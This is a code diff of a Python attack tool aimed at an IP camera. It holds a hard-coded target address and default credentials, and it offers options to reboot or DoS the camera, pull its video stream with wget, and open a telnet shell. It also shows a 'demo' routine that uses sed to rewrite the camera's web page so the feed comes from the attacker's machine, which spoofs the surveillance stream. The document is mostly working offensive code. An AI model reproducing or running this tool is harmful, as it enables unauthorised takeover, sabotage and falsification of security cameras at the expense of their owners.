@@ -1,6 +1,6 @@
 import os,sys,time,socket,subprocess,telnetlib
-target = "0.0.0.0"  #IP Camera
-webpage = "monitor4.asp"
+target = "10.10.10.4"  #IP Camera
+webpage = "monitor.asp"
 user = "admin"
 password = "ipcam_rt"
 banner = """
@@ -21,14 +21,9 @@ Welcome!!!
 
 main = """Please Select an option:
 [1] Reboot Camera
-[2] Kill Feed*
+[2] DOS Camera
 [3] Grab Stream
 [4] Shell Session
-[5] Perform Reconnaisance*
-[6]
-[7]
-[8]
-[9] Play Spy Music
 [0] Exit
 
 Other:
@@ -77,7 +72,7 @@ def exec_menu(choice):
 #                           Functions                               #
 #===================================================================#
 def reboot():
-    command = "/bin/reboot\n"
+    command = "reboot\n"
     start_exploit()
     connect()
     tn.write(command + "\n")
@@ -94,9 +89,10 @@ def kill():
     prompt()
     tn.close()
 
+#os.system("wget 'http://" + target + "/vjpeg.v?user=admin&pwd=Admin1234!' -O stream")
 def grab():
     print "grabbing stream"
-    os.system("wget 'http://" + target + "/vjpeg.v?user=admin&pwd=Admin1234!' -O stream")
+    os.system("wget 'http://" + target + "/vjpeg.v?user=&pwd=' -O stream")
     prompt()
 
 def shell():
@@ -106,11 +102,12 @@ def shell():
 
 
 #Change hard-coded port into variable? Need to test with cam
+#Change hard-coded refresh time into variable?
 def demo():
     self_ip = get_ip()
     FNULL = open(os.devnull, 'w')
     command1 = "cp /www/" + webpage + " /www/monitor.asp.bak1" #Creates backup
-    command2 = "sed -i 's#/vjpeg.v#http://" + self_ip + ":4000#' /www/" + webpage + " && sed -i 's/pragma/refresh/' /www/" + webpage + " && sed -i 's/no-cache/7/' /www/" + webpage #spoof stream
+    command2 = "sed -i 's#/vjpeg.v#http://" + self_ip + ":4000#' /www/" + webpage + " && sed -i 's/pragma/refresh/' /www/" + webpage + " && sed -i 's/no-cache/15/' /www/" + webpage #spoof stream
     command3 = "/root/start_web.sh" #restart webserver
     command4 = "cp /www/monitor.asp.bak1 /www/" + webpage
     loading("Creating Fake Stream Server")
@@ -194,12 +191,10 @@ menu_actions = {
     '2': kill,
     '3': grab,
     '4': shell,
-    '5': recon,
     'x': demo,
     'i': info,
     '0': exit,
     'q': exit,
-    '9': music,
 }
 
 
